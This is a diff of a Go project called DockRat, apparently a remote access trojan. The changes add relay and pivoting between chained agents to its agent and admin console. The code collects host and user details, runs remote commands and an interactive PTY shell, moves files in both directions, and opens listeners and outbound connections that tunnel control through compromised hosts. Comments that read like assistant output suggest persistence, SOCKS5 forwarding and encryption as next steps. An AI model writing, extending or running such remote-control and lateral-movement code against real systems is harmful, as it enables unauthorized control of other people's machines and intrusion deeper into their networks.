@@ -36,8 +36,6 @@ func main() {
 子文件夹：./cmd/agent
 文件：./cmd/agent/main.go
 内容：
-
-
 package main
 
 import (
@@ -47,14 +45,16 @@ import (
 	"os"
 	"runtime"
 
-	"github.com/Singert/DockRat/core/protocol"
 	"github.com/Singert/DockRat/core/network"
+	"github.com/Singert/DockRat/core/protocol"
 )
 
 type HandshakePayload struct {
 	Hostname string `json:"hostname"`
 	Username string `json:"username"`
-	OS       string `json:"os"` 
+	OS       string `json:"os"`
+	SelfID   int    `json:"self_id"`   // 当前 agent 的 ID
+	ParentID int    `json:"parent_id"` // 初始为 -1，表示没有父节点
 }
 
 func main() {
@@ -75,6 +75,7 @@ func main() {
 		Hostname: hostname,
 		Username: username,
 		OS:       runtime.GOOS,
+		ParentID: -1, //初始为 -1，表示没有父节点
 	}
 	payloadBytes, _ := json.Marshal(payload)
 
@@ -95,10 +96,22 @@ func main() {
 
 	log.Println("[+] Handshake message sent")
 
-	network.StartAgent(conn)
+	network.StartAgent(&network.AgentContext{
+		SelfID:     1,
+		Conn:       conn,
+		ParentConn: nil, // 顶级 agent，无上层
+	})
 }
 
+/*是否继续实现：
 
+    🐚 持久化 shell 模式（交互式 stdin/stdout）
+
+    🛰️ socks5 转发或端口映射
+
+    🔐 TLS/AES 加密通信层
+
+你可以指定想优先开发的子模块。 */
 
 子文件夹：./core
 子文件夹：./core/common
@@ -134,6 +147,7 @@ type HandshakePayload struct {
 	Hostname string `json:"hostname"`
 	Username string `json:"username"`
 	OS       string `json:"os"`
+	ParentID int    `json:"parent_id"` // 初始为 -1，表示没有父节点
 }
 
 func StartListener(addr string, registry *node.Registry) {
@@ -191,8 +205,10 @@ func handleConnection(conn net.Conn, registry *node.Registry) {
 			Username: payload.Username,
 			OS:       payload.OS,
 			Addr:     conn.RemoteAddr().String(),
+			ParentID: payload.ParentID,
 		}
 		id := registry.Add(n)
+
 		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)
 
 		go handleAgentMessages(n, registry)
@@ -249,20 +265,40 @@ import (
 	"net"
 	"os"
 	"os/exec"
-
+	"runtime"
+	"strconv"
 	"strings"
+	"sync"
 
 	"github.com/Singert/DockRat/core/protocol"
 	"github.com/Singert/DockRat/core/utils"
 	"github.com/creack/pty"
 )
 
+// 封装每个 agent 实例上下文
+type AgentContext struct {
+	SelfID     int
+	Conn       net.Conn
+	ParentConn net.Conn
+}
+
 var shellStarted = false
 var shellStdin io.WriteCloser
 
 var currentUploadFile *os.File
 
-func StartAgent(conn net.Conn) {
+var childConnMap = make(map[int]net.Conn)
+var childConnMu sync.Mutex
+
+// 用于延迟绑定连接
+var pendingConns []net.Conn
+var pendingMu sync.Mutex
+
+func StartAgent(ctx *AgentContext) {
+	conn := ctx.Conn
+	selfID := ctx.SelfID
+	parent := ctx.ParentConn
+
 	for {
 		lengthBuf := make([]byte, 4)
 		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
@@ -282,11 +318,31 @@ func StartAgent(conn net.Conn) {
 			continue
 		}
 
+		if msg.ToNodeID != 0 {
+			relayToChild(msg)
+			continue
+		}
+
 		switch msg.Type {
 		case protocol.MsgCommand:
-			handleCommand(msg, conn)
+			handleCommand(msg, conn, selfID, parent)
 		case protocol.MsgShell:
-			handleShellPTY(msg, conn)
+			if msg.FromNodeID == 0 {
+				handleShellPTY(msg, conn, selfID, parent)
+			} else {
+				if parent != nil {
+					relayUpward(msg, parent)
+				} else {
+					conn.Write(data)
+				}
+			}
+		case protocol.MsgResponse:
+			if parent != nil {
+				relayUpward(msg, parent)
+			} else {
+				encoded, _ := protocol.EncodeMessage(msg)
+				conn.Write(encoded)
+			}
 		case protocol.MsgUploadInit:
 			handleUploadInit(msg)
 		case protocol.MsgUploadChunk:
@@ -295,13 +351,37 @@ func StartAgent(conn net.Conn) {
 			handleUploadDone()
 		case protocol.MsgDownloadInit:
 			handleDownloadInit(msg, conn)
+		case protocol.MsgListen:
+			handleListenCommand(msg, ctx)
+		case protocol.MsgConnect:
+			handleConnectCommand(msg)
+		case protocol.MsgBindRelayConn:
+			handleBindRelayConn(msg)
 		default:
 			log.Println("[-] Unknown message type:", msg.Type)
 		}
 	}
 }
 
-func handleCommand(msg protocol.Message, conn net.Conn) {
+func relayToChild(msg protocol.Message) {
+	childConnMu.Lock()
+	conn, ok := childConnMap[msg.ToNodeID]
+	childConnMu.Unlock()
+
+	if !ok {
+		log.Printf("[-] No child with ID %d found for relay\n", msg.ToNodeID)
+		return
+	}
+
+	data, err := protocol.EncodeMessage(msg)
+	if err != nil {
+		log.Println("[-] Relay encode error:", err)
+		return
+	}
+	conn.Write(data)
+}
+
+func handleCommand(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
 	var payload map[string]string
 	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 		log.Println("[-] Command unmarshal error:", err)
@@ -316,14 +396,15 @@ func handleCommand(msg protocol.Message, conn net.Conn) {
 	}
 
 	resp := protocol.Message{
-		Type:    protocol.MsgResponse,
-		Payload: output,
+		Type:       protocol.MsgResponse,
+		Payload:    output,
+		FromNodeID: selfID,
 	}
 	data, _ := protocol.EncodeMessage(resp)
 	conn.Write(data)
 }
 
-func handleShellPTY(msg protocol.Message, conn net.Conn) {
+func handleShellPTY(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
 	line := string(msg.Payload)
 
 	if !shellStarted {
@@ -345,32 +426,25 @@ func handleShellPTY(msg protocol.Message, conn net.Conn) {
 					return
 				}
 				msg := protocol.Message{
-					Type:    protocol.MsgShell,
-					Payload: buf[:n],
+					Type:       protocol.MsgShell,
+					Payload:    buf[:n],
+					FromNodeID: selfID,
 				}
 				data, err := protocol.EncodeMessage(msg)
 				if err != nil {
 					log.Println("[-] Shell encode error:", err)
 					return
 				}
-				_, err = conn.Write(data)
-				if err != nil {
-					log.Println("[-] Shell write error:", err)
-					return
-				}
+				conn.Write(data)
 			}
 		}()
 		return
 	}
 
-	// 已启动 shell，则写入 stdin
 	if !strings.HasSuffix(line, "\n") {
 		line += "\n"
 	}
-	_, err := shellStdin.Write([]byte(line))
-	if err != nil {
-		log.Println("[-] Write to shell error:", err)
-	}
+	shellStdin.Write([]byte(line))
 }
 
 func handleUploadInit(msg protocol.Message) {
@@ -455,6 +529,180 @@ func handleDownloadInit(msg protocol.Message, conn net.Conn) {
 	log.Println("[+] File download finished")
 }
 
+func handleListenCommand(msg protocol.Message, ctx *AgentContext) {
+	var payload map[string]string
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Listen command decode failed:", err)
+		return
+	}
+	port := payload["port"]
+	go func() {
+		ln, err := net.Listen("tcp", ":"+port)
+		if err != nil {
+			log.Println("[-] Agent listen failed:", err)
+			return
+		}
+		log.Println("[+] Agent listening on port", port)
+		for {
+			conn, err := ln.Accept()
+			if err != nil {
+				log.Println("[-] Accept failed:", err)
+				continue
+			}
+			go handleChildConn(conn, ctx.Conn) // 保持不变，parentConn 会在 handleChildConn 中传入
+		}
+	}()
+}
+
+func handleConnectCommand(msg protocol.Message) {
+	var payload map[string]string
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Connect command decode failed:", err)
+		return
+	}
+	target := payload["target"]
+	parentIDStr := payload["parent_id"] // 当前节点的 ID，将作为 child 的 parent
+	parentID, _ := strconv.Atoi(parentIDStr)
+	conn, err := net.Dial("tcp", target)
+	if err != nil {
+		log.Println("[-] Failed to connect target:", err)
+		return
+	}
+	log.Println("[+] Connected to parent agent", target)
+
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+
+	// 注意：这个 parent_id 会被对方当作 selfID 使用
+	payloadData := map[string]interface{}{
+		"hostname": hostname,
+		"username": username,
+		"os":       runtime.GOOS,
+		"relay_id": parentID,
+	}
+	data, _ := json.Marshal(payloadData)
+	msgToSend := protocol.Message{
+		Type:    protocol.MsgHandshake,
+		Payload: data,
+	}
+	packet, _ := protocol.EncodeMessage(msgToSend)
+	conn.Write(packet)
+
+	// 将 conn 作为子节点的连接，自己是 parent（nil）→ 被连接端来处理 StartAgent
+	// 不调用 StartAgent(conn)！StartAgent 应在 handleChildConn 中由上级执行
+}
+
+func handleChildConn(conn net.Conn, parentConn net.Conn) {
+	log.Println("[+] Received child connection from", conn.RemoteAddr())
+
+	// 读取 4 字节长度前缀
+	lengthBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+		log.Println("[-] Failed to read handshake length:", err)
+		conn.Close()
+		return
+	}
+	length := utils.BytesToUint32(lengthBuf)
+
+	// 读取消息内容
+	data := make([]byte, length)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		log.Println("[-] Failed to read handshake data:", err)
+		conn.Close()
+		return
+	}
+
+	// 解码 handshake 消息
+	msg, err := protocol.DecodeMessage(data)
+	if err != nil || msg.Type != protocol.MsgHandshake {
+		log.Println("[-] Invalid handshake from child")
+		conn.Close()
+		return
+	}
+	// 提取 relay_id（表示 admin 分配的最终 nodeID）
+	var payload map[string]interface{}
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Failed to parse handshake payload:", err)
+		conn.Close()
+		return
+	}
+	idFloat, ok := payload["relay_id"].(float64)
+	if !ok {
+		log.Println("[-] Missing relay_id in handshake")
+		conn.Close()
+		return
+	}
+	relayID := int(idFloat)
+
+	// 将连接存入 pendingConns，等待绑定指令
+	pendingMu.Lock()
+	pendingConns = append(pendingConns, conn)
+	pendingMu.Unlock()
+	log.Println("[+] Child handshake received, storing connection as pending")
+
+	// 启动该连接的命令处理循环（SelfID 暂未知）
+	go StartAgent(&AgentContext{
+		SelfID:     -2, // 真实 ID 尚未分配
+		Conn:       conn,
+		ParentConn: parentConn,
+	})
+	// 通知 admin 或上级 relay：“我有一个连接，目标是 relayID，请绑定我”
+	bindPayload := protocol.BindRelayConnPayload{ID: relayID}
+	bindData, _ := json.Marshal(bindPayload)
+	bindMsg := protocol.Message{
+		Type:    protocol.MsgBindRelayConn,
+		Payload: bindData,
+	}
+	buf, _ := protocol.EncodeMessage(bindMsg)
+	_, err = parentConn.Write(buf)
+	if err != nil {
+		log.Printf("[-] Failed to send BindRelayConn to parent: %v\n", err)
+	} else {
+		log.Printf("[*] Sent BindRelayConn to parent for ID %d\n", relayID)
+	}
+
+}
+
+func relayUpward(msg protocol.Message, parent net.Conn) {
+	data, err := protocol.EncodeMessage(msg)
+	if err != nil {
+		log.Println("[-] Relay upward encode error:", err)
+		return
+	}
+	_, err = parent.Write(data)
+	if err != nil {
+		log.Println("[-] Relay upward write failed:", err)
+	}
+}
+
+func handleBindRelayConn(msg protocol.Message) {
+	var payload protocol.BindRelayConnPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] BindRelayConn decode error:", err)
+		return
+	}
+
+	pendingMu.Lock()
+	defer pendingMu.Unlock()
+
+	if len(pendingConns) == 0 {
+		log.Println("[-] No pending conn to bind")
+		return
+	}
+
+	conn := pendingConns[0]
+	pendingConns = pendingConns[1:]
+
+	childConnMu.Lock()
+	childConnMap[payload.ID] = conn
+	childConnMu.Unlock()
+
+	log.Printf("[+] Bound pending connection as node ID %d\n", payload.ID)
+}
+
 文件：./core/network/packet.go
 内容：
 package network
@@ -471,6 +719,7 @@ import (
 
 type Node struct {
 	ID       int
+	ParentID int
 	Conn     net.Conn
 	Hostname string
 	Username string
@@ -525,11 +774,31 @@ func (r *Registry) Remove(id int) {
 	delete(r.nodes, id)
 }
 
+func (r *Registry) GetChildren(parentID int) []*Node {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	children := []*Node{}
+	for _, node := range r.nodes {
+		if node.ParentID == parentID {
+			children = append(children, node)
+		}
+	}
+	return children
+}
+
 func (n *Node) String() string {
 	return fmt.Sprintf("Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s",
 		n.ID, n.Addr, n.Hostname, n.Username, n.OS)
 }
 
+/*
+现在你的 NodeRegistry 已具备完整的增、删、查、列能力，下一步你可以轻松支持：
+
+    控制指定节点：通过 registry.Get(id) 发送命令
+
+    实现自动断线剔除：通过 Remove(id) 清除离线节点
+*/
 
 文件：./core/node/topology.go
 内容：
@@ -552,6 +821,8 @@ import (
 )
 
 var downloadChan = make(chan []byte, 100)
+
+var currentNodeID = -1
 
 func StartConsole(registry *node.Registry) {
 	scanner := bufio.NewScanner(os.Stdin)
@@ -583,6 +854,16 @@ func StartConsole(registry *node.Registry) {
 			handleUpload(arg, registry)
 		case "download":
 			handleDownload(arg, registry)
+		case "listen":
+			handleListen(arg, registry)
+		case "connect":
+			handleConnect(arg, registry)
+		case "use":
+			handleUse(arg, registry)
+		case "topo":
+			handleTopo(registry)
+		case "whoami":
+			fmt.Printf("[*] Current node ID: %d\n", currentNodeID)
 		default:
 			fmt.Println("[-] Unknown command")
 		}
@@ -593,31 +874,28 @@ func handleDetail(reg *node.Registry) {
 	nodes := reg.List()
 	fmt.Println("[+] Connected nodes:")
 	for _, n := range nodes {
-		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
-			n.ID, n.Addr, n.Hostname, n.Username, n.OS)
+		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s, ParentID: %d\n",
+			n.ID, n.Addr, n.Hostname, n.Username, n.OS, n.ParentID)
 	}
 }
 
 func handleExec(arg string, reg *node.Registry) {
-	parts := strings.SplitN(arg, " ", 2)
-	if len(parts) != 2 {
-		fmt.Println("[-] Usage: exec <node_id> <command>")
+	if currentNodeID == -1 {
+		fmt.Println("[-] No node selected. Use `use <id>` first.")
 		return
 	}
-	id := parts[0]
-	cmdStr := parts[1]
-	var nid int
-	fmt.Sscanf(id, "%d", &nid)
-	n, ok := reg.Get(nid)
+	n, ok := reg.Get(currentNodeID)
 	if !ok {
-		fmt.Println("[-] No such node")
+		fmt.Println("[-] Node not found")
 		return
 	}
-	cmdPayload := map[string]string{"cmd": cmdStr}
+
+	cmdPayload := map[string]string{"cmd": arg}
 	data, _ := json.Marshal(cmdPayload)
 	msg := Message{
-		Type:    MsgCommand,
-		Payload: data,
+		Type:     MsgCommand,
+		Payload:  data,
+		ToNodeID: currentNodeID,
 	}
 	buf, err := EncodeMessage(msg)
 	if err != nil {
@@ -631,17 +909,21 @@ func handleExec(arg string, reg *node.Registry) {
 	}
 }
 
-func handleShell(arg string, reg *node.Registry) {
-	var nid int
-	fmt.Sscanf(arg, "%d", &nid)
-	n, ok := reg.Get(nid)
-	if !ok {
-		fmt.Println("[-] No such node")
+func handleShell(_ string, reg *node.Registry) {
+	if currentNodeID == -1 {
+		fmt.Println("[-] No node selected. Use `use <id>` first.")
 		return
 	}
+	n, ok := reg.Get(currentNodeID)
+	if !ok {
+		fmt.Println("[-] Node not found")
+		return
+	}
+
 	msg := Message{
-		Type:    MsgShell,
-		Payload: []byte("start shell"),
+		Type:     MsgShell,
+		Payload:  []byte("start shell"),
+		ToNodeID: currentNodeID,
 	}
 	buf, err := EncodeMessage(msg)
 	if err != nil {
@@ -653,6 +935,7 @@ func handleShell(arg string, reg *node.Registry) {
 		fmt.Println("[-] Send failed:", err)
 		return
 	}
+
 	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
 	inputScanner := bufio.NewScanner(os.Stdin)
 	for {
@@ -666,8 +949,9 @@ func handleShell(arg string, reg *node.Registry) {
 			break
 		}
 		cmdMsg := Message{
-			Type:    MsgShell,
-			Payload: []byte(line + "\n"),
+			Type:     MsgShell,
+			Payload:  []byte(line + "\n"),
+			ToNodeID: currentNodeID,
 		}
 		buf, err := EncodeMessage(cmdMsg)
 		if err != nil {
@@ -707,31 +991,40 @@ func readShellOutput(conn io.Reader) {
 }
 
 func handleUpload(arg string, registry *node.Registry) {
-	parts := strings.SplitN(arg, " ", 3)
-	if len(parts) != 3 {
-		fmt.Println("[-] Usage: upload <node_id> <local_file> <remote_file>")
+	if currentNodeID == -1 {
+		fmt.Println("[-] No node selected. Use `use <id>` first.")
 		return
 	}
-	var nid int
-	fmt.Sscanf(parts[0], "%d", &nid)
-	n, ok := registry.Get(nid)
+	n, ok := registry.Get(currentNodeID)
 	if !ok {
 		fmt.Println("[-] No such node")
 		return
 	}
-	file, err := os.Open(parts[1])
+
+	parts := strings.SplitN(arg, " ", 2)
+	if len(parts) != 2 {
+		fmt.Println("[-] Usage: upload <local_file> <remote_file>")
+		return
+	}
+
+	local := strings.TrimSpace(parts[0])
+	remote := strings.TrimSpace(parts[1])
+
+	file, err := os.Open(local)
 	if err != nil {
 		fmt.Println("[-] Failed to open file:", err)
 		return
 	}
 	defer file.Close()
+
 	fileInfo, err := file.Stat()
 	if err != nil {
 		fmt.Println("[-] Failed to get file info:", err)
 		return
 	}
+
 	initPayload := UploadInitPayload{
-		Filename: parts[2],
+		Filename: remote,
 		Filesize: fileInfo.Size(),
 	}
 	payloadBytes, err := json.Marshal(initPayload)
@@ -740,8 +1033,9 @@ func handleUpload(arg string, registry *node.Registry) {
 		return
 	}
 	msg := Message{
-		Type:    MsgUploadInit,
-		Payload: payloadBytes,
+		Type:     MsgUploadInit,
+		Payload:  payloadBytes,
+		ToNodeID: currentNodeID,
 	}
 	buf, err := EncodeMessage(msg)
 	if err != nil {
@@ -760,8 +1054,9 @@ func handleUpload(arg string, registry *node.Registry) {
 				Data: bufData[:nr]}
 			data, _ := json.Marshal(chunk)
 			msg := Message{
-				Type:    MsgUploadChunk,
-				Payload: data,
+				Type:     MsgUploadChunk,
+				Payload:  data,
+				ToNodeID: currentNodeID,
 			}
 			pkt, _ := EncodeMessage(msg)
 			n.Conn.Write(pkt)
@@ -775,33 +1070,42 @@ func handleUpload(arg string, registry *node.Registry) {
 		}
 	}
 	done := Message{
-		Type:    MsgUploadDone,
-		Payload: []byte("done")}
+		Type:     MsgUploadDone,
+		Payload:  []byte("done"),
+		ToNodeID: currentNodeID,
+	}
 	pkt, _ := EncodeMessage(done)
 	n.Conn.Write(pkt)
 	fmt.Println("[+] Upload completed")
 }
 
 func handleDownload(arg string, registry *node.Registry) {
-	parts := strings.SplitN(arg, " ", 3)
-	if len(parts) != 3 {
-		fmt.Println("[-] Usage: download <node_id> <remote_file> <local_file>")
+	if currentNodeID == -1 {
+		fmt.Println("[-] No node selected. Use `use <id>` first.")
 		return
 	}
-	var nid int
-	fmt.Sscanf(parts[0], "%d", &nid)
-	n, ok := registry.Get(nid)
+	n, ok := registry.Get(currentNodeID)
 	if !ok {
 		fmt.Println("[-] No such node")
 		return
 	}
-	req := DownloadInitPayload{Filename: parts[1]}
+
+	parts := strings.SplitN(arg, " ", 2)
+	if len(parts) != 2 {
+		fmt.Println("[-] Usage: download <remote_file> <local_file>")
+		return
+	}
+
+	remote := strings.TrimSpace(parts[0])
+	local := strings.TrimSpace(parts[1])
+
+	req := DownloadInitPayload{Filename: remote}
 	data, _ := json.Marshal(req)
-	msg := Message{Type: MsgDownloadInit, Payload: data}
+	msg := Message{Type: MsgDownloadInit, Payload: data, ToNodeID: currentNodeID}
 	buf, _ := EncodeMessage(msg)
 	n.Conn.Write(buf)
 
-	out, err := os.Create(parts[2])
+	out, err := os.Create(local)
 	if err != nil {
 		fmt.Println("[-] Create file error:", err)
 		return
@@ -814,6 +1118,100 @@ func handleDownload(arg string, registry *node.Registry) {
 		out.Write(payload.Data)
 	}
 	fmt.Println("[+] Download complete")
+}
+
+func handleListen(arg string, reg *node.Registry) {
+	parts := strings.Split(arg, " ")
+	if len(parts) != 2 {
+		fmt.Println("[-] Usage: listen <node_id> <port>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	port := parts[1]
+
+	n, ok := reg.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+
+	payload := map[string]string{
+		"port": port,
+	}
+	data, _ := json.Marshal(payload)
+	msg := Message{
+		Type:    MsgListen,
+		Payload: data,
+	}
+	buf, _ := EncodeMessage(msg)
+	n.Conn.Write(buf)
+	fmt.Println("[+] Listen command sent")
+}
+
+func handleConnect(arg string, reg *node.Registry) {
+	parts := strings.Split(arg, " ")
+	if len(parts) != 3 {
+		fmt.Println("[-] Usage: connect <node_id> <ip:port> <parentID>")
+		return
+	}
+	var nid, pid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	target := parts[1]
+	fmt.Sscanf(parts[2], "%d", &pid)
+
+	n, ok := reg.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+
+	payload := map[string]string{
+		"target":    target,
+		"parent_id": fmt.Sprintf("%d", pid),
+	}
+	data, _ := json.Marshal(payload)
+	msg := Message{
+		Type:    MsgConnect,
+		Payload: data,
+	}
+	buf, _ := EncodeMessage(msg)
+	n.Conn.Write(buf)
+	fmt.Println("[+] Connect command sent")
+	fmt.Printf("[*] Connecting node %d to %s via parent %d\n", nid, target, pid)
+
+}
+
+func handleUse(arg string, reg *node.Registry) {
+	var nid int
+	fmt.Sscanf(arg, "%d", &nid)
+	if _, ok := reg.Get(nid); !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+	currentNodeID = nid
+	fmt.Printf("[+] Switched to node %d\n", nid)
+}
+
+func handleTopo(reg *node.Registry) {
+	var printNode func(id int, depth int)
+	printNode = func(id int, depth int) {
+		n, ok := reg.Get(id)
+		if !ok {
+			return
+		}
+		fmt.Printf("%s[%d] %s@%s\n", strings.Repeat("  ", depth), id, n.Username, n.Hostname)
+		for _, child := range reg.GetChildren(id) {
+			printNode(child.ID, depth+1)
+		}
+	}
+
+	fmt.Println("[+] Topology Tree:")
+	for _, node := range reg.List() {
+		if node.ParentID == -1 {
+			printNode(node.ID, 0)
+		}
+	}
 }
 
 文件：./core/protocol/file_transfer.go
@@ -867,13 +1265,23 @@ const (
 	MsgCommand   MessageType = "command"
 	MsgResponse  MessageType = "response"
 	MsgShell     MessageType = "shell"
+	// 拓扑相关消息	「
+	MsgListen        MessageType = "listen"
+	MsgConnect       MessageType = "connect"
+	MsgBindRelayConn MessageType = "bind_relay_conn" // 用于转发连接请求的回复
 )
 
 // Message 是基本通信结构
 // 结构体经过 JSON 编码后再加上长度前缀发送
 type Message struct {
-	Type    MessageType // such as handshake,shell,upload
-	Payload []byte      // the data to be sent, such as command or file content
+	Type       MessageType // such as handshake,shell,upload
+	Payload    []byte      // the data to be sent, such as command or file content
+	ToNodeID   int         `json:"to,omitempty"`   // 目标节点ID，,该字段仅由 admin → relay agent 时设置，用于转发给 child 节点
+	FromNodeID int         `json:"from,omitempty"` // 源节点ID，通常由 agent → relay agent 时设置
+}
+
+type BindRelayConnPayload struct {
+	ID int `json:"id"` // 要绑定的目标 Node ID
 }
 
 // EncodeMessage 将Message编码带长度前缀的字节流
@@ -927,24 +1335,4 @@ package utils
 func BytesToUint32(b []byte) uint32 {
 	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
 }
-
-
-
-子文件夹：./download
-文件：./download/a.md
-内容：
-
-文件：./go.mod
-内容：
-module github.com/Singert/DockRat
-
-go 1.23.2
-
-require github.com/creack/pty v1.1.24
-
-文件：./go.sum
-内容：
-github.com/creack/pty v1.1.24 h1:bJrF4RRfyJnbTJqzRLHzcGaZK1NeM5kTC9jGgovnR1s=
-github.com/creack/pty v1.1.24/go.mod h1:08sCNb52WyoAwi2QDyzUCTgcvVFhUzewun7wtTfvcwE=
-
 
